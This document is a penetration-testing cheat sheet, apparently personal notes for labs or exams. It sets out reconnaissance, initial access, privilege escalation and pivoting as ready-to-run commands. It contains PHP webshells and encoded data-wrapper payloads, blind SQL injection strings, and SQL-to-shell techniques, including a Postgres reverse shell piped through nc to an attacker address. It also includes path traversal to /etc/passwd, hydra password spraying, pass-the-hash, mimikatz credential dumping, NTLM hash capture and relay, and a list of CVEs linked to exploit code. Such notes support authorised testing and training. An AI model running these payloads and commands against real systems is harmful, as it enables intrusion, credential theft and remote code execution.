# STAGE 1 - RECONNAISSANCE
## Ping sweep
	ip a
List interfaces  

	nmap -sn 123.123.123.0/24
Host discovery  

## General portscan
	nmap -p- --min-rate=1000 -T4 -oN output.txt 123.123.123.123
Flags: All ports, rapid, aggressive, results to output.txt  
Reduce T value or skip min-rate for unstable/slow networks  

	nmap -Pn -sT 123.123.123.123
Flags: Skip ping, basic TCP scan  

	nmap -g53 123.123.123.123
Flags: Source port 53 (may bypass some filtering rules)  

## Versioning portscan
	nmap -p 100,200 -sC -sV -oN output-version.txt 123.123.123.123
Flags: Ports 100,200, NSE script, check version, results to output.txt  

## UDP portscan
UDP is a pain to portscan because a response is not obligatory  

	nmap -sUV -F 123.123.123.123
Flags: Scan udp, check version, only check most common 100 UDP ports  
Open: response obtained. Open|Filtered: unknown.  

	udpx -t 123.123.123.123 -c 128 -w 1000
Flags: 128 concurrent checks, timeout after 1000 ms  

## Exploit Search
    searchsploit "service-version"

## nmap-less
	nc -nv -w 1 -z 123.123.123.123 100-150
unix netcat portscan on ports 100 to 150  

	150..200 | ForEach-Object {Test-NetConnection 123.123.123.123 -Port $_}
powershell portscan on ports 100 to 150  

## SMB recon
	sudo nbtscan -r 123.123.123.0/24
list NetBIOS name  

# STAGE 2 - INITIAL ACCESS
## Netcat Shell Catching
	nc -lvnp 5000
Flags: listen mode, verbose, no DNS, on port 5000  
Victim machine must be configured to send a shell to the attacker on this port  

	https://www.revshells.com/
.  

## Webservers
### Webscan
	sudo nmap -sV --script http-enum -p 80,443 123.123.123.123
Enum with nmap  

	nikto -h http://123.123.123.123
Basic webscan  

	sudo nano /etc/nikto.conf
To use nikto with cookies  

### Fingerprinting
	nikto -h http://123.123.123.123 -Tuning b
Software identification only  

	curl -I http://123.123.123.123
Header only  

### Directory Enumeration
	gobuster dir -u http://123.123.123.123 -w directory-list-2.3-small.txt -e .php,.txt,.bak,.config,.py -o gobuster-output.txt
Flags: Use directory namelist, find extensions, save results  

	ffuf -u http://targeturl.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404
Directory fuzz, filter responses codes 403 & 404  

	ffuf -u http://targeturl.com -H "Host: FUZZ.targeturl.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
Virtual host fuzz, filter responses to 3 words  

	ffuf -u http://FUZZ.targeturl.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
Subdomain fuzz  

	ffuf -u http://targeturl.com/FUZZ -w /wordlist.txt -b "PHPSESSID=33ptqlqcbf3odc4a9e0l1qa65d"
Fuzz with cookie  

	curl -H "Content-Type: application/json" -d "abc" http://123.123.123.123
POST request with json type  

	/robots.txt
	/sitemap.xml
.  

### Wordpress plugin scan
	wpscan --url http://123.123.123.123

### Webshells
	<?php echo system("whoami"); ?>
PHP webshell  

	<?php echo system($_GET['cmd']); ?>
parameter webshell: `http://URL/vulnerable.php?cmd=whoami` or `http://URL/index.php?page=vulnerable&cmd=whoami`  

	http://URL/vulnerable.php?page=data://test/plain,<?php$20echo%20system('whoami');?>
data wrapper  

	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
base64 encoded data wrapper  

### Magic hashes
PHP Loose comparison with magic hashes (0e...)  
Set inputs to 0  

### URL Path traversal
	curl --path-as-is http://123.123.123.123/../../../../../etc/passwd
`--path-as-is` is required as curl will squash `../` by default  

## Injections
### Commands injections
	...; id #
Include # to comment out code behind  

### MySQL Blind
	INJECTION and if (1=1,sleep(3),'false')

### MSSQL Blind
	INJECTION;waitfor delay '0:0:3';

### Postgres Blind
	INJECTION;select pg_sleep(3)--

## SQL info extraction
### list db
	select schema_name from information_schema.schemata
if dbo is listed, server is MSSQL. use `select name from sys.databases` instead  

### list tables mysql
	select table_name from information_schema.tables where table_schema='db'

### list tables mssql
	select table_name from db.information_schema.tables

### list columns mysql
	select column_name, data_type from information_schema.columns where table_schema='db' and table_name='table'
to reference a table, use `db.table`  

### list tables mssql
	select column_name, data_type from db.information_schema.columns where table_name='table'
to reference a table, use `db.dbo.table`  

### postgresql error output
	INJECTION'; DO $$ BEGIN RAISE EXCEPTION '%', (SELECT string_agg(datname, ', ') FROM pg_database);END; $$;-- - 
if site only shows output on error, use this to run queries and output it as error. String_agg concats all rows

## SQL to shell
### mssql
	EXECUTE sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXECUTE sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;
	EXECUTE xp_cmdshell 'whoami';

### mysql
	INJECTION' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"; -- - 
Disk location must be writable. Find a way to execute the php file  

### postgres
	'; COPY (SELECT '') to program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 123.123.123.1 4444 >/tmp/f';-- - 

## SQL Misc
### mssqlpwner
	mssqlpwner domain/user:password@123.123.123.123 interactive
Flags: Connect to SQL server in interactive shell  

	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
Flags: Execute direct query, impersonate as appdev, dump users table  

### nxc
	nxc mssql 123.123.123.123 -u user -p password --rid-brute > rid-output.txt
Flags: Domain username RID bruteforce, save results  

## Password Cracking
### MD5 Rainbow Table
If the hash contains 32-char hex,  

    https://crackstation.net/
### Hash bruteforce
	hashcat -m 10000 hash.txt passlist.txt
Flags: Use module 10000, crack hash.txt, use passlist.txt  

### hydra
	hydra -l user -P passlist.txt ssh://123.123.123.123:22
password guess. Use `-L userlist.txt and -p password` for password spray  

	hydra -l username -P passlist.txt 123.123.123.123 http-post-form "/login.php:userparameter=^USER^&passparameter=^PASS^:Login failed!"
post login with specific parameters. `Login failed!` is the failure string


## Compromised User Access
### SSH
	ssh user@123.123.123.123
with input password  

	ssh -i rsa.file -p 10000 user@123.123.123.123
with rsa private key, over port 10000  

### WinRM
	evil-winrm -i 123.123.123.123 -u username -p password

### nxc
	nxc <proto> 123.123.123.123 --port 8000 -u <filename|name> -p <filename|name> --continue-on-success
Bruteforce usernames and passwords via the protocol on port 8000  

### SMB
	smbclient -L //123.123.123.123 -U username%password
List shares  

	impacket-psexec username:password@123.123.123.123
Use `\` to escape special characters in password. Requires admin  

### MSSQL login
	impacket-mssqlclient user:password@123.123.123.123 -windows-auth
windows-auth uses NTLM  

### MySQL login
	mysql -u user -p'pass' -h 123.123.123.123 -P 3306 --skip-ssl-verify-server-cert

### Pass the Hash
	smbclient //123.123.123.123/share -U Administrator --pw-nt-hash <hash>

	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
if `LM hash` is unused, do `:<NT hash>`. Same format for `impacket-wmiexec`. Alternatively, add 32 0s for LM Hash.  

# STAGE 3 - PRIVILEGE ESCALATION
## Weakness Enumeration (Linpeas/Winpeas)
From attacker, `cd` to directory of enumerator  

    python3 -m http.server 80
Host python webserver containing enumerator for victim  

### From victim,
### Linpeas
	curl -o linpeas.sh 10.10.10.10/linpeas.sh
Download the enumerator from your webserver  
  
	sh linpeas.sh > linpeas-output.txt
Run the script and save results  
### Winpeas
	Invoke-WebRequest -Uri 'http://10.10.10.10/WinPEASx64.exe' -OutFile '.\winpeas.exe'
Download the enumerator from your webserver  
Wrap in `powershell -c "Invoke-Web..."` if needed  

	./winpeas.exe > winpeas-output.txt
Run the script and save results  

## Windows - file transfer
	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
Convert file into clipboard contents  

	[IO.File]::WriteAllBytes("C:\filename", [Convert]::FromBase64String("base64string"))
Write clipboard into file  

## Windows - directory
	tree /f
.  

	dir /s/a/q/n

## Windows - user check
	Get-LocalUser | ForEach-Object { $u = $_; [PSCustomObject]@{ User = $u.Name; Groups = (Get-LocalGroup | Where-Object { (Get-LocalGroupMember $_ -ErrorAction SilentlyContinue).Name -match [regex]::Escape($u.Name) }).Name -join ', ' } }
List all users and their groups  

## Windows - search
	Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.rtf -File -Recurse -ErrorAction SilentlyContinue
Search for any file with .kdbx extension  

## Windows - check env
	systeminfo
.  

	whoami /all
.  

	net users
.  

	set
.  

	tasklist /svc

## Windows - services
	sc \\localhost query state= all| findstr SERVICE_NAME
List all services  

	sc qc servicename
Queryconfig service  

	for /f "tokens=2 delims=: " %s in ('sc query state^= all ^| findstr "SERVICE_NAME"') do @(for /f "delims=" %t in ('sc qc "%s" ^| findstr "BINARY_PATH_NAME"') do @echo %s && echo %t)
Show all binary paths  

	Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.PathName -notlike "*system32\svchost*"}
List all services and binary paths, omit svchost  

## Windows - open ports
	netstat -ano

## Windows - registry
	reg query "HKLM\software\microsoft\windows\currentversion\run" /s
List startup programs  

	reg query "HKLM\software\microsoft\windows\currentversion\runonce" /s
List one-time startup programs  

## Windows - permissions
	icacls filename.ext
Look for F, W, M access  

	icacls . /t /c
List access recursively  

	icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*"

## Windows - mimikatz
	privilege::debug
	sekurlsa::logonpasswords
View logon passwords  

	token::elevate
	lsadump::sam
	lsadump::secrets
LSADump  

	https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file

## Windows - powershell history
	type $((Get-PSReadlineOption).HistorySavePath)
File is usually `Appdata/roaming/microsoft/windows/Powershell/PSreadline/consolehost_history.txt`  

	Get-History
Finds current shell history  

## Windows - powershell scriptblock logging
Event ID 4104 in App-Log>Microsoft/Windows/Powershell/Operational.  

## Windows - impersonate token
	https://www.offsec.com/metasploit-unleashed/fun-incognito/

## Linux - file transfer
	cat filename | base64 -w 0;echo
Convert file into clipboard contents  

	echo -n 'base64code' | base64 -d > filename
Save clipboard into file  

	nc -l -p 8000 --recv-only > filename
Save nc contents on port 8000 into filename  

	nc --send-only 123.123.123.123 8000 < filename
Send filename contents into target port 8000 over nc  

## Linux - directory
	tree

## Linux - check powers
	id
	sudo -l

## Linux - services
	ps aux | grep root
List root-running services  

	ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
List services binary path  

## Linux - open ports
	ss -tulnp

## Linux - permissions
	find / -perm -4000 -type f 2>/dev/null
List SUID files  

	find / -perm -2000 -type f 2>/dev/null
List GUID files  

	find / -perm -2 -type f 2>/dev/null
List world-writable files  

# STAGE 3.5 - PIVOT
## Windows - port forwarding
	netsh interface portproxy add v4tov4 listenport=8000 listenaddress=LISTENIP connectport=7000 connectaddress=CONNECTIP

## Linux - port forwarding
	ssh -L 8000:10.10.1.1:7000 user@123.123.123.123
SSH tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
Execute on attacker machine  
Localhost/123.123.123.1 <--> 123.123.123.123/10.10.10.10 <--> 10.10.1.1  
Afterwards, connect to localhost:8000 to access  

	rm /tmp/p;mkfifo /tmp/p;nc -lvnp 8000 < /tmp/p | nc 10.10.1.1 7000 > /tmp/p
NC tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
Afterwards, connect to 123.123.123.123:8000 to access  

	sysctl net.ipv4.ip_forward
	sudo sysctl -w net.ipv4.ip_forward
Check if iptables forwarding is enabled  

	sudo iptables -t nat -A PREROUTING -i eth0 -o tcp -d LISTENIP --dport 8000 -j DNAT --to-destination CONNECTIP:7000
	sudo iptables -t nat -A POSTROUTING -i eth1 -o tcp -d CONNECTIP --dport 7000 -j SNAT --to-source LISTENIP2
Set pre and post routes, iptables  

## SSH + proxychains
	ssh -D 9050 remoteuser@123.123.123.123
Set a SSH forward on localhost 9050  

	tail /etc/proxychains.conf
Ensure there is a line `socks4 127.0.0.1 9050`

	sudo proxychains nmap -v -Pn -sT INTERNALIP
proxychain nmap portscan on one host  

	proxychains xfreerdp /v:INTERNALIP /u:username /p:password
proxychain rdp connect  

## Net-NTLMv2 hash catching
	impacket-smbserver -ip <host-ip> TMP /tmp -smb2support -debug -outputfile outfile.txt
Host an smb server to catch smb credentials. Hashes will be found in `./outfile.txt`  

	dir \\<host-ip>\tmp
From target machine, initiate an smb connection.  
Alternatively, force machine to initiate an smb connection with web uploads i.e. filename `//<host-ip>/tmp`  

## Net-NTLM relay
	impacket-ntlmrelayx --no-http-server -smb2support -t 123.123.123.130 -c <command>
listen for smb connections and relay them to 123.123.123.130 and execute command there  

# APPENDIX
## Kali built-in wordlists
### Passwords
	cd /usr/share/wordlists/rockyou.txt.gz
	gzip -d rockyou.txt.gz
Flags: Extract the list from .gz  

### Directories
	/usr/share/wordlists/dirbuster
	/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
Directories  

	/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
Extensions  

	/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Subdomains  

	/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
GET/POST parameters  

## Seclists
	sudo apt install seclists
	/usr/share/seclists/

## assetnote.io
	https://wordlists.assetnote.io/

## HTTP headers
	(POST|GET|PUT) / HTTP/1.1
	Content-Type: application/x-www-form-urlencoded
	Content-Type: application/json
	Authorization: Bearer <token>
	Authorization: Basic <token>
	Authorization: OAuth <token>
	Cookie: $Version=1; Skin=new;
	Host: en.wikipedia.org
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
  
## Vulnerabilities
|Software|Version|CVE|Link|
|---|---|---|---|
|Docker Desktop for Windows|4.44.2|CVE-2025-9074|[CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)|
|Cacti|1.2.29|CVE-2025-24367|[CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)|
|pkexec||CVE-2021-4034|[pwnkit](https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures)|
|vsftpd|2.3.4|CVE-2011-2523|[Exploitdb](https://www.exploit-db.com/exploits/49757)|
|Apache|2.4.49|CVE-2021-41773|see url path traversal|
|Grafana|8.3.0 and more|CVE-2021-43798|[grafana-cve-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798)|
|Perfect Survey (Wordpress)|<1.5.2|CVE-2021-24762|[metasploit-module](https://github.com/aaryan-11-x/My-Metasploit-Modules/blob/main/CVE-2021-24762%3A%20WordPress%20Plugin%20Perfect%20Survey%201.5.1%20-%20SQLi%20(Unauthenticated)/wp_perfect_survey_sqli.rb)|


## Quote escapes
	curl -H 'Custom-Header: <?php echo system($_GET['\''cmd'\'']); ?>'
Use `''` to escape all other special characters. Close quote and `\'` and reopen to include one single quote  

For double quotes, `$`, `` ` ``, `"`, `\`, `!` must be escaped with backslash.  
